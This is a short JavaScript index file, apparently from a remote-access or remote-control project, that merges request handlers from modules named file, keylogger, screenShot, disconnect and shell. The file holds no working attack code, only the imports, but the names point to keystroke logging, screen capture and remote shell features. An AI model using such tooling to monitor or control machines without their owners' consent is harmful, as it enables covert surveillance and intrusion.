/*
 * @Auther: MercyLin
 * @Description: 请求方法
 * @Date: 2020-09-08 16:53:33
 * @LastEditors: MercyLin
 * @LastEditTime: 2020-09-10 22:06:53
 * @FilePath: \my-project\src\main\Connect\request\index.js
 */

import file from './file'
import keylogger from './keylogger'
import screenShot from './screenShot'
import disconnect from './disconnect'
import shell from './shell'

export default {
  ...file,
  ...keylogger,
  ...screenShot,
  ...disconnect,
  ...shell
}
